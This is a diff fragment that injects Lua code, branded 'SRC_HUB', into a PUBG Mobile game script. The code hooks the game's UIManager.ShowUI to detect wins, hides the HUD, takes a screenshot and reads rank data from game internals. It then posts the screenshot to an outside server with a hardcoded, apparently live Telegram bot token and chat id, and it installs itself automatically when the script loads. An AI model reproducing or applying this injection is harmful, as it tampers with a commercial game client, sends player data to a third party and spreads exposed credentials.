+					.. "&bot_token=" .. AF_UrlEncode("8694640232:AAFtTYFQvIHmniw5hRBnYKo4P-Znawt8dVE")
+					.. "&chat_id=" .. AF_UrlEncode("8694640232")
+				httpManager:Post(
+					AutoFeedback.Config.ServerURL,
+					{["Content-Type"] = "application/x-www-form-urlencoded"},
+					body,
+					nil,
+					function(success, _, response, errorMessage)
+						if success and response and tostring(response):find('"status":%s*true') then
+							AF_Notify("[SRC_HUB] Successfully sent! (Kills: " .. tostring(kills) .. ")")
+						else
+							local detail = tostring(response or errorMessage):sub(1, 40)
+							AF_Notify("[SRC_HUB] VIP Server error: " .. detail)
+						end
+						AF_RemoveFile(path)
+					end,
+					60
+				)
+				return
+			end
+			attempts = attempts + 1
+			if attempts < 5 and AF_AddTimerOnce(1.0, TrySend) then
+				return
+			end
+			AF_Notify("[SRC_HUB] Screenshot capture failed!")
+			AF_RemoveFile(path)
+		end
+		TrySend()
+	end)
+	if not ok then
+		AF_Log("SendFeedback Error: " .. tostring(err))
+	end
+end
+
+local AF_HudNames = {
+	"BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
+	"VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
+	"SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
+	"Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
+}
+
+local function AF_GetRankAndSegment()
+	local rank = 0
+	local segment = 0
+	pcall(function()
+		local battleResult = _G.BP_STRUCT_BattleResultData
+		local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
+		if rating then
+			rank = tonumber(rating.rank_rating) or 0
+			segment = tonumber(rating.new_segment) or 0
+		end
+		if rank == 0 then
+			local funcUtil = AF_GetModule("common.func_util")
+			local roleData = _G.DataMgr and _G.DataMgr.roleData
+			if funcUtil and type(funcUtil.GetCurMaxSegementLevel) == "function"
+				and roleData and roleData.allzoneSegment then
+				segment = tonumber(funcUtil.GetCurMaxSegementLevel(roleData.allzoneSegment)) or 0
+			end
+			if roleData and roleData.segment_rating then
+				for _, value in pairs(roleData.segment_rating) do
+					if type(value) == "table" then
+						for _, nestedValue in pairs(value) do
+							if type(nestedValue) == "number" and nestedValue > rank then
+								rank = nestedValue
+							end
+						end
+					elseif type(value) == "number" and value > rank then
+						rank = value
+					end
+				end
+			end
+		end
+	end)
+	return rank, segment
+end
+
+local function AF_CreateHudController()
+	local hidden = {}
+	local function SetHidden(hide)
+		local UIManager = _G.UIManager
+		if not UIManager then return end
+		if hide then
+			for _, name in ipairs(AF_HudNames) do
+				local config
+				if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
+					config = UIManager.UI_Config_InGame[name]
+				elseif UIManager.UI_Config and UIManager.UI_Config[name] then
+					config = UIManager.UI_Config[name]
+				end
+				if config then
+					local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
+					if view then
+						pcall(function()
+							if type(view.SetVisibility) == "function" then
+								view:SetVisibility(2)
+							elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
+								view.UIRoot:SetVisibility(2)
+							elseif type(UIManager.HideUI) == "function" then
+								UIManager.HideUI(config)
+							elseif type(UIManager.CloseUI) == "function" then
+								UIManager.CloseUI(config)
+							end
+						end)
+						table.insert(hidden, {config = config, view = view})
+					end
+				end
+			end
+			return
+		end
+		for _, item in ipairs(hidden) do
+			pcall(function()
+				if item.view and type(item.view.SetVisibility) == "function" then
+					item.view:SetVisibility(0)
+				elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
+					item.view.UIRoot:SetVisibility(0)
+				elseif type(UIManager.ShowUI) == "function" then
+					UIManager.ShowUI(item.config)
+				end
+			end)
+		end
+		hidden = {}
+	end
+	return SetHidden
+end
+
+local function AF_GetScreenshotDirectory()
+	local directories = {}
+	local home = os.getenv("HOME")
+	if home and home ~= "" then
+		table.insert(directories, home .. "/Documents/ShadowTrackerExtra/Saved/")
+	end
+	local packages = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
+	for _, packageName in ipairs(packages) do
+		table.insert(directories,
+			"/storage/emulated/0/Android/data/" .. packageName
+			.. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
+	end
+	local selected = directories[1]
+	for _, directory in ipairs(directories) do
+		local testPath = directory .. "t.tmp"
+		local file = io.open(testPath, "w")
+		if file then
+			file:close()
+			os.remove(testPath)
+			selected = directory
+			break
+		end
+	end
+	return selected
+end
+
+local function AF_CaptureAndSend(kills, rank, segment, restoreHud)
+	local restored = false
+	local function RestoreHudOnce()
+		if not restored then
+			restored = true
+			restoreHud(false)
+		end
+	end
+	local ScreenshotMaker = import("ScreenshotMaker")
+	if not ScreenshotMaker then RestoreHudOnce(); return end
+	local directory = AF_GetScreenshotDirectory()
+	if not directory then RestoreHudOnce(); return end
+	local path = directory .. string.format("kongwin_%s.jpg", os.time())
+	local uiUtil = AF_GetModule("client.common.ui_util")
+	local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
+	local enginePreTick = gameInstance and gameInstance.EnginePreTick
+	if not enginePreTick or type(enginePreTick.Add) ~= "function" then
+		RestoreHudOnce(); return
+	end
+	local ticker = AF_GetModule("common.time_ticker")
+	if not ticker or type(ticker.AddTimerOnce) ~= "function" then
+		RestoreHudOnce(); return
+	end
+	enginePreTick:Add(function()
+		local actualPath = ScreenshotMaker.MakePictureByName(path, true)
+		if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
+		if actualPath and actualPath ~= "" then path = actualPath end
+		local attempts = 0
+		local function CheckCapture()
+			attempts = attempts + 1
+			local captured = false
+			pcall(function() captured = ScreenshotMaker.HasCaptured(path) end)
+			if captured then
+				RestoreHudOnce()
+				AF_Log("HasCaptured=true. Flushing to disk via ResizePicture...")
+				pcall(ScreenshotMaker.ResizePicture, path, 0.9, path)
+				ticker.AddTimerOnce(2.0, function()
+					if #AF_ReadFile(path) > 0 then
+						AutoFeedback.SendFeedback(path, kills, rank, segment)
+					else
+						AF_Notify("[SRC_HUB] iOS image read error!")
+					end
+				end)
+			elseif attempts < 15 then
+				ticker.AddTimerOnce(1, CheckCapture)
+			else
+				RestoreHudOnce()
+				AF_Notify("[SRC_HUB] Screenshot capture failed!")
+			end
+		end
+		ticker.AddTimerOnce(1, CheckCapture)
+	end)
+end
+
+function AutoFeedback.ProcessWin(kills)
+	kills = tonumber(kills) or 0
+	local rank, segment = AF_GetRankAndSegment()
+	-- ✅ ALL RANKS SUPPORTED - Sirf kills check (kills > 0)
+	if kills <= 0 then
+		AF_Log(string.format("Skipping feedback: Kill %d (Requires Kill > 0)", kills))
+		return
+	end
+	AF_Notify("[SRC_HUB] Congratulations on getting TOP 1! Rank: " .. AF_GetRankName(rank))
+	local setHudHidden = AF_CreateHudController()
+	setHudHidden(true)
+	local ok, err = pcall(AF_CaptureAndSend, kills, rank, segment, setHudHidden)
+	if not ok then
+		setHudHidden(false)
+		AF_Log("ProcessWin Error: " .. tostring(err))
+	end
+end
+
+local function AF_GetWinnerKills()
+	local kills = 0
+	pcall(function()
+		local likeUtil = AF_GetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
+		if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
+			local playerState = likeUtil.GetMyPlayerState()
+			if playerState and playerState.Kills then
+				kills = tonumber(playerState.Kills) or 0
+			end
+		end
+		if kills == 0 then
+			local resultLogic = AF_GetModule(
+				"GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic",
+				false
+			)
+			if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
+				local result = resultLogic:GetBattleResultData()
+				if result and result.BP_mykill then
+					kills = tonumber(result.BP_mykill) or 0
+				end
+			end
+		end
+	end)
+	return kills
+end
+
+local function AF_TryInstallHook()
+	pcall(function()
+		local UIManager = _G.UIManager
+		if not UIManager or not UIManager.ShowUI then return end
+		if UIManager.__SRCHUBHooked then
+			UIManager.__SRCHUBHooked = false
+		end
+		AF_Log("Hooking UIManager.ShowUI for in-game Winner UI...")
+		local originalShowUI = UIManager.ShowUI
+		UIManager.ShowUI = function(config, params, ...)
+			local result = originalShowUI(config, params, ...)
+			pcall(function()
+				-- ✅ STRONG WINNER DETECTION - Chicken Dinner Fix
+				if not params then return end
+
+				local isWinner = params.Reason == "win"
+					or params.ShowedWinLogo == true
+					or params.IsWin == true
+					or params.IsWinner == true
+					or params.bWin == true
+					or params.Win == true
+
+				if not isWinner then return end
+
+				local kills = AF_GetWinnerKills()
+				if not AF_AddTimerOnce(2, function() AutoFeedback.ProcessWin(kills) end) then
+					AutoFeedback.ProcessWin(kills)
+				end
+			end)
+			return result
+		end
+		-- UIManager.__SRCHUBHooked = true
+		AF_Log("UIManager Hook installed successfully.")
+	end)
+end
+
+function AutoFeedback.Install()
+	AF_Log("Installing Pro system (Telegram)...")
+	if AutoFeedback.Config.TestMode then
+		pcall(function()
+			AF_AddTimerOnce(5.0, function() AutoFeedback.ProcessWin() end)
+		end)
+	end
+	pcall(function()
+		local ticker = AF_GetModule("common.time_ticker")
+		if ticker and type(ticker.AddTimer) == "function" then
+			ticker.AddTimer(3.0, AF_TryInstallHook)
+		else
+			AF_TryInstallHook()
+		end
+	end)
+end
+
+_G.GODxRJ_AutoFeedbackRecovered = AutoFeedback
+AutoFeedback.Install()
+-- ============================================================
+-- END AUTO FEEDBACK SYSTEM
+-- ============================================================
 -- THE RETURN SECTION RETAINS THE ORIGINAL CODE. ===================
 local class = require("class")
 local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
